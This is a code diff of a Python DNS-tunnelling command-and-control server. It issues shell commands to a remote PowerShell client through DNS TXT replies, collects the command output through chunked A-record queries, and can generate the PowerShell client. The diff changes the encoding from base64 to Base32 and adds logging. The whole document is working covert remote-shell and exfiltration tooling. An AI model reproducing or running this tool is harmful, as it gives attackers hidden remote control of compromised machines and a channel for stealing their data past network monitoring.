@@ -44,18 +44,9 @@ def base64_encode_string(string):
     return encoded_string
 
 
-def restore_case_by_hyphen(encoded_string):
-    decoded_string = ""
-    i = 0
-
-    while i < len(encoded_string):
-        if encoded_string[i] == "-":
-            i += 1  # Skip the hyphen
-            decoded_string += encoded_string[i].upper()
-        else:
-            decoded_string += encoded_string[i]
-        i += 1
-
+def base32_decode_string(encoded_string):
+    decoded_bytes = base64.b32decode(encoded_string)
+    decoded_string = decoded_bytes.decode('utf-8')
     return decoded_string
 
 
@@ -65,6 +56,8 @@ settings = {
     "ip": "0.0.0.0",
     "port": 53
 }
+loglevel = "INFO"
+
 
 def generateClient():
     # Function to generate client
@@ -83,89 +76,101 @@ def generateClient():
     # export the file to the path specified
     with open(path, 'w') as f:
         f.write(content)
-        
+
     print("Client generated and exported to {path}")
+
 
 def parseRequest(request, addr):
     return {
-            "ip_address": addr[0],
-            "domain_name": str(request.q.qname),
-            "query_class": str(request.q.qclass),
-            "query_type": QTYPE[request.q.qtype],
-            "domain_parts": str(request.q.qname).replace(f".{settings['domain']}", "").split(".")
+        "ip_address": addr[0],
+        "domain_name": str(request.q.qname),
+        "query_class": str(request.q.qclass),
+        "query_type": QTYPE[request.q.qtype],
+        "domain_parts": str(request.q.qname).replace(f".{settings['domain']}", "").split(".")
     }
 
-def sendData(code,counter,command):
-    #print("func: SendData")
+
+def sendData(code, counter, command):
+    if(loglevel >= 2):
+        print("func: SendData")
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     s.bind((settings["ip"], int(settings["port"])))
     while True:
-        #print("Waiting fo Client to get it's data")
+        if(loglevel >= 1):
+            print("Waiting fo Client to get it's data")
         rawrequest, addr = s.recvfrom(1024)
         request = DNSRecord.parse(rawrequest)
         query = parseRequest(request, addr)
         if(query["query_type"] == "TXT" and query["domain_name"].lower() == f"{counter}.{code}.{settings['domain']}.".lower()):
             # Build response with command
             command = base64_encode_string(command)
-            response = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
+            response = DNSRecord(
+                DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
             TTL = 60 * 5
             rdata = TXT(command.encode("utf-8"))
-            response.add_answer(RR(rname=request.q.qname, rtype=QTYPE.TXT, rclass=1, ttl=TTL, rdata=rdata))
+            response.add_answer(
+                RR(rname=request.q.qname, rtype=QTYPE.TXT, rclass=1, ttl=TTL, rdata=rdata))
             s.sendto(b'%s' % response.pack(), addr)
-            return;
-        #else:
-            #print("No valid request")
+            return
+        else:
+            if(loglevel >= 2):
+                print("No valid request")
 
 
-def getData(code,counter):
-    #print("func: GetData")
+def getData(code, counter):
+    if(loglevel >= 2):
+        print("func: GetData")
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     s.bind((settings["ip"], int(settings["port"])))
     while True:
         rawrequest, addr = s.recvfrom(1024)
         request = DNSRecord.parse(rawrequest)
         query = parseRequest(request, addr)
-        #print(f"Request from: {query['ip_address']} for {query['domain_name']} type {query['query_type']}")
+        if(loglevel >= 2):
+            print(f"Request from: {query['ip_address']} for {query['domain_name']} type {query['query_type']}")
         if query["query_type"] == "A" and query["domain_name"].lower().endswith(f"{code}-{counter}.{settings['domain']}.".lower()):
             thisdata = query["domain_parts"]
 
             if not thisdata[3] in data:
                 data[thisdata[3]] = {}
             data[thisdata[3]][int(thisdata[1])
-                                ] = thisdata[0].replace("_", "=")
+                              ] = thisdata[0].replace("_", "=")
 
-            print_progress(len(data[thisdata[3]]), int(thisdata[2]), prefix=f'Packet {len(data[thisdata[3]])}/{thisdata[2]}', suffix='Complete', bar_length=50)
+            print_progress(len(data[thisdata[3]]), int(
+                thisdata[2]), prefix=f'Packet {len(data[thisdata[3]])}/{thisdata[2]}', suffix='Complete', bar_length=50)
             if len(data[thisdata[3]]) == int(thisdata[2]):
-                #print("--------------------- Data recieved ---------------------")
+                if(loglevel >= 1):
+                    print("--------------------- Data recieved ---------------------")
                 # Put the data together in one variable
                 datastring = ""
                 for i in range(0, int(thisdata[2])):
                     datastring += data[thisdata[3]][i]
 
-                # Lower because anti dns caching messed up the cases
-                datastring = datastring.lower()
+                # Upper because anti dns caching messed up the cases, Base32 is all upper case and case sensitive
+                datastring = datastring.upper()
 
-                #print(f"Base64 with hyphens: {datastring}")
-                # For every letter in the string, if there is a hyphen in front of it, change it to upper case
-                datastring = restore_case_by_hyphen(datastring)
+                if(loglevel >= 2):
+                    print(f"Base32: {datastring}")
 
-                #print(f"Base64: {datastring}")
-
-                # base64 decode
-                decoded = base64_decode_string(datastring)
+                # Base32 decode
+                decoded = base32_decode_string(datastring)
                 # JSON decode
-                #print(f"JSON: {decoded}")
+                if(loglevel >= 1):
+                    print(f"JSON: {decoded}")
                 response = json.loads(decoded)
                 return response
-            
-            response = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
-                #TTL = 60 * 5
-                #rdata = A("1.1.1.1")
-                #response.add_answer(RR(rname=request.q.qname, rtype=QTYPE.A, rclass=1, ttl=TTL, rdata=rdata))
-            
+
+            response = DNSRecord(
+                DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
+            #TTL = 60 * 5
+            #rdata = A("1.1.1.1")
+            #response.add_answer(RR(rname=request.q.qname, rtype=QTYPE.A, rclass=1, ttl=TTL, rdata=rdata))
+
             s.sendto(b'%s' % response.pack(), addr)
-        #else:
-            #print("No valid request")
+        else:
+            if(loglevel >= 2):
+                print("No valid request")
+
 
 def startServer():
     pwd = ""
@@ -194,7 +199,7 @@ def startServer():
 
         readline.add_history(command)
 
-        sendData(code,counter,command)
+        sendData(code, counter, command)
 
         if command != "exit":
             response = getData(code, counter)
@@ -206,28 +211,38 @@ def startServer():
             print(output)
 
         counter += 1
-        
+
+
 def setSettings():
     currentDomain = settings['domain'] or "None"
     currentIP = settings['ip'] or "0.0.0.0"
     currentPort = settings["port"] or 53
     # Prompt for domain and expose, and show current settings
-    settings['domain'] = input(f'Enter domain (Press [Enter] for current: \"{currentDomain}\"): ') or currentDomain
-    settings['ip'] = input(f'Enter the IP/Hostname that the dns server should listen to (0.0.0.0 to listen to every ip) (Press [Enter] for current: \"{currentIP}\"): ') or currentIP
-    settings['port'] = input(f'Enter the Port that the dns server should listen to (Press [Enter] for current: \"{currentPort}\"): ') or currentPort
-    
+    settings['domain'] = input(
+        f'Enter domain (Press [Enter] for current: \"{currentDomain}\"): ') or currentDomain
+    settings['ip'] = input(
+        f'Enter the IP/Hostname that the dns server should listen to (0.0.0.0 to listen to every ip) (Press [Enter] for current: \"{currentIP}\"): ') or currentIP
+    settings['port'] = input(
+        f'Enter the Port that the dns server should listen to (Press [Enter] for current: \"{currentPort}\"): ') or currentPort
+
     with open('settings.json', 'w') as f:
         json.dump(settings, f)
 
+
 def main():
     global settings
+    global loglevel
     parser = argparse.ArgumentParser()
     parser.add_argument("--start-server", action="store_true",
                         help="Starts the listener")
     parser.add_argument("--generate-client", action="store_true",
                         help="Generates the .ps1 client file")
+    parser.add_argument("--log-level", type=int, default=0,
+                        help="Set the log level (ERROR=0, INFO=1, DEBUG=2)")
     args = parser.parse_args()
-    
+
+    loglevel = args.log_level or 0
+
     # Handle settings
     # if settings.json exists, load it into the variable settings
     # if not, create it and prompt user for domain and expose
@@ -245,7 +260,7 @@ def main():
         generateClient()
     else:
         while True:
-        # Give the user a choice based on the arguments, if the user inputs an invalid number, prompt again
+            # Give the user a choice based on the arguments, if the user inputs an invalid number, prompt again
             print("--------------- Please choose an option: ---------------")
             print(f"1) Start the listener")
             print(f"2) Generate the .ps1 client file")
@@ -263,7 +278,6 @@ def main():
                 break
             else:
                 print("Invalid choice")
-        
 
 
 def print_progress(iteration, total, prefix='', suffix='', decimals=1, bar_length=100):
